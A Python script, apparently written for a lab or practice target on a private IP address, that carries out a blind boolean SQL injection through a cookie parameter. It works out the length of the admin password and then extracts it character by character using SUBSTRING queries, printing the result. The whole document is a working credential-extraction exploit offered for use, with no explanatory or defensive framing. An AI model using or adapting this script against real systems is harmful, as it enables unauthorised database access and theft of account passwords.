
import math
import requests
from bs4 import BeautifulSoup
import re
url ='http://192.168.229.130:8080/index.php/'
cookie={'id':'14 ','level':'0'}
def get(cookies):
    response=requests.get(url,cookies=cookies)
    html_doc=response.text
    soup=BeautifulSoup(html_doc,'html.parser')
    eles=soup.select('h1')
    return eles
def countPass():
    i=1
    eles=get(cookie)
    if len(eles)==0:
        return 'url hoac cookie sai'
    while len(eles)>0:
        i=i+1
        cookies={'id':'14 AND (SELECT \'a\' FROM users WHERE username=\'admin\' AND LENGTH(password)>%s)=\'a\''%i,'level':'0'}
        eles=get(cookies)
        if len(eles)>0:
            match=(re.search('let post something',eles[0].get_text()))
            if match==None:
                break
    return i
    # while match!=None:
    #     i=i+1

def findPass():
    count=countPass()
    password=''
    list=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0']
    for i in range(count):
        for j in list:
            cookies={'id':'14 AND (SELECT SUBSTRING(password,%d,1) FROM users WHERE username=\'admin\')=\'%s\''%(i+1,j),'level':'0'}
            eles=get(cookies)
            if len(eles)>0:
                match=(re.search('let post something',eles[0].get_text()))
                if match!=None:
                    password=password+j
    return password

c=findPass()

print('password for admin is: %s'%c)

